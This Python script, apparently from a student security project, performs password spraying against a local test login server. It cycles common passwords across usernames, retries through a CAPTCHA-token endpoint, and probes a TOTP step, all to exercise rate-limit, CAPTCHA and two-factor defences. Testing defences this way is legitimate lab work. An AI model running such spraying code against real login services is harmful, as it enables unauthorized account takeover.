
import server.util as util
import time
import csv
import requests, os
from pathlib import Path

LOGIN_URL = "http://127.0.0.1:5000/login"
USERS = util.get_usernames_by_category()
LOGIN_TOTP_URL = "http://127.0.0.1:5000/login_totp"
CAPTCHA_URL = "http://127.0.0.1:5000/admin/get_captcha_token"
GROUP_SEED = 114467408
MAX_DURATION = 7200 #this is two hours 

# Get the directory where the current file (util.py) is located
BASE_DIR = Path(__file__).resolve().parent

# .parent moves up to 'Cyber Project', then we navigate down to the json file
PASSWORD_FILE = BASE_DIR.parent / "common_passwords.csv"
    
def password_spraying():
    
    with open(PASSWORD_FILE, newline="", encoding="utf-8") as f:
        reader = csv.reader(f)
        next(reader)
        start = time.perf_counter()
        count = 0
        for row in reader:
                password = row[0]
                for user in USERS:
                    elapsed_time = time.perf_counter() - start
                    if elapsed_time < MAX_DURATION:
                        response = requests.post(
                            LOGIN_URL,
                            data={
                                "username": user,
                                "password": password
                            }
                        )
                        success, code_resp = "/dashboard" in response.url, response.status_code 
                        #if success :
                         #   return 
                        # ----- Rate-limit and Lockout -----
                        if code_resp == 429:
                            print("User blocked")
                            #count+=1
                            #if count == 30:
                                #print("Attack has been blocked by the system")
                                #return 
                                
                                
                        # ----- CAPTCHA -----
                        if code_resp == 603:
                            data = response.json()

                            if data.get("captcha_required"):
                                captcha = requests.post(
                                    CAPTCHA_URL ,
                                    data={"group_seed":GROUP_SEED},
                                    cookies=response.cookies
                                    )
                                
                                data_captcha = captcha.json()
                            
                                if not data_captcha.get("captcha_required"):
                                    response = requests.post(
                                        LOGIN_URL,
                                        data={
                                            "username": user,
                                            "password": password,
                                            "captcha_token": data_captcha.get("captcha_token")
                                        },
                                        cookies=response.cookies
                                    )  
                                    success, code_resp = "/dashboard" in response.url, response.status_code 
                                    if success:
                                        continue
                                    
                           
                        #------ TOTP -------
                        if code_resp == 503: #If TOTP is required.
                            
                            totp_response = requests.post(
                                LOGIN_TOTP_URL,  # TOTP verification URL
                                data={
                                    "username": user,
                                    "TOTP_token": ""
                                },
                                cookies=response.cookies  #Retain session (cookies) to maintain state
                            )
                            #Log the failure (simulating a TOTP fail)
                            if totp_response.status_code == 501:
                                print(f"TOTP fail for user {user} with password {password}")
                            
                            break    
                        

                    else:
                        print(f"Time limit reached ({elapsed_time:.2f}s)Shutting down.")
                        return 
                    time.sleep(0.05) 
            

